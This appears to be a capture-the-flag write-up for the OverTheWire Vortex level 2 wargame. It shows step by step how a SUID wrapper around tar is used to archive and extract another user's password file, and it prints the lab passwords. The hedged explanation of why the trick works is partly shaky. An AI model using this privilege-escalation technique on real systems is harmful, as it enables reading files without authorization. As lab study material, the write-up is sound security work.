## VORTEX2

Login to the vortex2 challenge via ssh :

```
critical@d3ad:~$ ssh vortex2@vortex.labs.overthewire.org -p 2228

                 _            
__   _____  _ __| |_ _____  __
\ \ / / _ \| '__| __/ _ \ \/ /
 \ V / (_) | |  | ||  __/>  < 
  \_/ \___/|_|   \__\___/_/\_\
                              
a http://www.overthewire.org wargame.

vortex2@vortex.labs.overthewire.org's password: 23anbT\rE
```

Source code provided :
```
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>


int main(int argc, char **argv)
{
        char *args[] = { "/bin/tar", "cf", "/tmp/ownership.$$.tar", argv[1], argv[2], argv[3] };
        execv(args[0], args);
}

```

### Analysis Of Source Code

* `execv()` is invoked which replaces the parent process address space with the new process it spawns. 
* The new process it creates depends on the *args* provided to it as parameter.
*  Here, it will spawn `/bin/tar` program with `cf` flag and three parameters provided by user as command line arguments.
* The `-c` flag creates an new archive (can be file or a directory).
* The `-f` flag specifies to perform action on a *file* or *device*.
* The character `'$$'` is a *special parameter* to the shell which expands into the Process ID (PID) of the shell.

### FURTHER
Our ultimate aim to read the password file `/etc/vortex_pass/vortex3`. Lets see the permissions with which the binary is running.


```
vortex2@vortex:~$ ls -l /vortex/vortex2
-r-sr-x--- 1 vortex3 vortex2 7303 May  6 04:22 /vortex/vortex2

vortex2@vortex:~$ ls -l /etc/vortex_pass/vortex3
-r-------- 1 vortex3 vortex3 10 May  6 04:21 /etc/vortex_pass/vortex3
```

The binary runs with SUID bit set on user `vortex3`, this means that the binary will function everything with the priveleges of user `vortex3`. So far, so good. Now, Look at the permissions of `/etc/vortex_pass/vortex3` which says '`-r-------- 1 vortex3 vortex3`', i.e. read only for user `vortex3`. So, is there a way we can make the binary read the file  `/etc/vortex_pass/vortex3` ?<br>
I could'nt think of any. So tried executing the binary and analyzing the result. 

```
vortex2@vortex:~$ /vortex/vortex2 /etc/vortex_pass/vortex3 
/bin/tar: Removing leading `/' from member names

vortex2@vortex:~$ ls -l '/tmp/ownership.$$.tar'
-rw-rw-r-- 1 vortex3 vortex2 10240 May  9 12:22 /tmp/ownership.$$.tar
```
Look at the permissions carefully, its `rw` for `vortex3` user and `rw` for group `vortex2` also (group permissions). This means that `vortex2` user can also extract the archive compressed by `vortex3`. Cool... lets see what are the permissions on the files inside the archive after extracting.

```
vortex2@vortex:~$ tar -tvf  '/tmp/ownership.$$.tar'
-r-------- vortex3/vortex3  10 2019-05-06 04:21 etc/vortex_pass/vortex3

vortex2@vortex:~$ tar -xvf  '/tmp/ownership.$$.tar'
etc/vortex_pass/vortex3

vortex2@vortex:~$ ls -l ./etc/vortex_pass/vortex3 
-r-------- 1 vortex2 vortex2 10 May  6 04:21 ./etc/vortex_pass/vortex3
```

We see that, the permissions of the file (previously compressed by `vortex3` with tar) remains the same (i.e. `-r--------`), 
<br>**but note** how `owner` and the `group` are changed to `vortex2` from `vortex3`. This means that the user decompressing the file has the same permissions that the user who compressed the file had.


**REASON** : I'm not sure of it, but the file before compression was in file system and had some permissions. But the file after compression is nomore that file, its just the data encoded by tar. So, whichever user (among groups too) extracts the archive, steals its name on the place of `owner` and `group` (with same permissions as the file had when created). 

**NOTE** : We can, however change the permissions of the file by using '`--mode=MODE`' (as explained in [this] blog post) with tar but that is not necessary here.

Let's cat the password
```
vortex2@vortex:~$ cat ./etc/vortex_pass/vortex3 
64ncXTvx#

```

This is maybe a new kind of vulnerability scenario, consider a scenario, a program running with root privileges (i.e. SUID bit set) compresses a `SecretPassword` file which it does not want anyone else to see. The `owner` of the file is `root` and in the `group` field a `local`(lower privileged) user may be included. In this scenario, the lower priveleged user can see the contents of the file by extracting the file.
<br>**Since after extracting the file, the permissions remain the same, `but` the `owner` and group field changes to the user who extracted the file**.

<br>
<br?>

NAME  : **ABHINAV THAKUR** <br>
EMAIL : **compilepeace@gmail.com**


[this]: https://mcpa.github.io/vortex/wargame/web/overthewire/2015/10/22/vortex02/